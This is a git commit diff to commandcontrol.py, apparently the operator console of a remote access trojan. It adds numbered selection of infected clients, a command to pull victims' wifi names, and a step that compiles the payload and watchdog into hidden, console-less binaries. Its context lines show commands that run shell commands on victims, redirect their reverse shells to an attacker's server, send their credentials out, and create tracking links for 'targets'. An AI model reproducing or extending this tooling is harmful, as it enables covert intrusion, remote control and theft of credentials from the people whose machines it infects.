9d4b460080104f7a25f4e62646a41aa75f049b6c
H0lyL337 <deadmanwalkingx13@gmail.com>
2023-03-17 10:46:50 -0400

    Update commandcontrol.py

--- commandcontrol.py
+++ commandcontrol.py
@@ -3,6 +3,8 @@ import subprocess
 import re
 import requests
 import apext_db
+import platform
+import shutil
 
 ### TO DO:
 ### THREADED FUNCTION LOOK FOR NEW USERS IN REALTIME AND UPDATE TO HUDS
@@ -11,6 +13,11 @@ import apext_db
 with open("./server.cfg", "r") as cfg:
     ip = '{0}'.format(cfg.readline()[7:].strip())
     port = '{0}'.format(cfg.readline()[5:].strip())
+
+if platform.uname()[0] == "Linux":
+    _OS = "linux"
+
+
 
 print("""  _____            _         _             
  |  __ \          | |       (_)            
@@ -21,11 +28,12 @@ print("""  _____            _         _
                                            
                                            """)
 
-print(''' please type in a command \n
+print(''' please type in a command \n   
 /list --list all registered users
 /target --target a registered user
 /create_link --create a token generated 1 time use dynamic link to gather information on a target.\n
 /configure_watchdog -- change master server for watchdog before compiling it.
+/compile -- compile python code using Nuitka/ Pyinstaller/ cxfreeze
 ''')
 
 while 1:
@@ -33,9 +41,11 @@ while 1:
         MAIN_INPUT = input()
         if MAIN_INPUT == '/list':
             RATLIST = []
+            i=0
             for rat in apext_db.get_rat_list():
                 RATLIST.append(rat)
-                print(rat)
+                print("{0} -- ".format(i) + "{0}".format( rat))
+                i+=1
             i2 = 1
             i = 0
             for rat in RATLIST:
@@ -50,38 +60,50 @@ while 1:
         pass
     
     if MAIN_INPUT == '/target':
-        print('What rat ip would you like to use?')
+        print('What client would you like to target?')
         RAT_IP = input()
-        print('What username for the ip would you like to use?')
-        RAT_IP_USER = input()
-        print(apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[0])
-        if apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[0] == RAT_IP and apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[1] == RAT_IP_USER:
-            username = apext_db.check_rat_existss(RAT_IP)[1]
-            print(''' Rat {0} exist choose a command 
+        
+        CLIENT_LIST = []
+
+        for client in apext_db.get_rat_list():
+            CLIENT_LIST.append(client)
+        
+        print(CLIENT_LIST[int(RAT_IP)])
+
+        CLIENT_IP =  CLIENT_LIST[int(RAT_IP)][0]
+        RAT_IP_USER = CLIENT_LIST[int(RAT_IP)][1]
+        CLEINT_UUID = CLIENT_LIST[int(RAT_IP)][5]
+        
+        print(CLIENT_IP)
+
+        print(''' Rat {0} exist choose a command 
 /command  #runs a bash command 
 /rshell   #attempts a reverse shell
 /rshell_show # shows whats server the targets reverse shell wants to connect too.
 /reboot    #attempts to send all creds if havent already'''.format(RAT_IP))
-            while 1:
+        while 1:
                 print('---------Enter command')
                 command = input()
                 if command == '/command':
                     print('please enter the terminal command, no return code or response will be seen.')
                     TERM_CMD = input()
-                    apext_db.user_command(RAT_IP, username, TERM_CMD)
+                    apext_db.user_command(CLIENT_IP, RAT_IP_USER, TERM_CMD, CLEINT_UUID)
 
                 if command == "/rshell_show":
-                    print(apext_db.get_rshell_master(RAT_IP, username))
-                    print(apext_db.get_rshell_master_port(RAT_IP, username))
+                    print(apext_db.get_rshell_master(CLIENT_IP, RAT_IP_USER, CLEINT_UUID))
+                    print(apext_db.get_rshell_master_port(CLIENT_IP, RAT_IP_USER, CLEINT_UUID))
 
                 elif command == '/rshell':
                     print('enter ip you want rat ip to connect to port used will be 1337')
                     master_ip = input()
                     print("enter the port.")
                     master_port = input()
-                    apext_db.rshell_master(RAT_IP, username, master_ip)
-                    apext_db.update_rshell_master_port(RAT_IP, username, master_port)
+                    apext_db.rshell_master(CLIENT_IP, RAT_IP_USER, master_ip, CLEINT_UUID)
+                    apext_db.update_rshell_master_port(CLIENT_IP, RAT_IP_USER, master_port, CLEINT_UUID)
                     print('changing masterp ip for this rat')
+
+                elif command == '/getwifi':
+                    print(apext_db.get_user_wifi_names(CLEINT_UUID))
 
                 elif command == '/help':
                     print('''
@@ -98,6 +120,50 @@ while 1:
         f.write('{0}\n'.format(n))
         f.close()
         print("Dynamic Token Link created : " + "http://{0}:{1}/inf/{2}".format(ip, port, n))
+
+    if MAIN_INPUT.lower() == '/compile':
+        print("what compiler would you like to use?\n\n 0) Nuitka \n 1) pyinstaller")
+        while 1:
+            i = input()
+            if i.lower() == "0":
+                if _OS == "linux":
+                    print("attempting to compile payload and watchdog using Nuitka.")
+                    try:
+                        os.system("python3 -m nuitka --standalone --onefile --disable-console payload.py")
+                        if os.path.exists("./static/linux/payload.bin"):
+                            os.remove("./static/linux/payload.bin")
+                        shutil.move("./payload.bin", "./static/linux")
+
+                        os.system("python3 -m nuitka --standalone --onefile --disable-console watchdog.py")
+                        if os.path.exists("./static/linux/watchdog.bin"):
+                            os.remove("./static/linux/watchdog.bin")
+                        shutil.move("./watchdog.bin", "./static/linux")
+
+                        print("Task Finished!")
+
+                    except Exception as e:
+                        print(e)
+                    break
+
+                elif _OS == "windows":
+                    ### Check if nuit exists
+                    print("checking if nuitka exists")
+                    proc = subprocess.Popen(["python -m nuitka --version"], stdout=subprocess.PIPE, shell=True)
+                    (out, err) = proc.communicate()
+                    if out[1:4] == b".1\n":
+                        print('Nuitka seems to be installed')
+                    else:
+                        print("Nuitka does'nt seem to be installed")
+                        ### attempt to install nuitka ###
+                        break
+                    import time
+                    time.sleep(5)
+                    print("attempting to compile payload and watchdog using Nuitka.")
+                    try:
+                        os.system("python3 -m nuitka --onefile --disable-console payload.py")
+                        os.system("python3 -m nuitka --onefile --disable-console watchdog.py")
+                    except Exception as e:
+                        print(e)
 
     if MAIN_INPUT.lower() == '/configure_watchdog':
         print(""" what would you like to change in watchdog \n
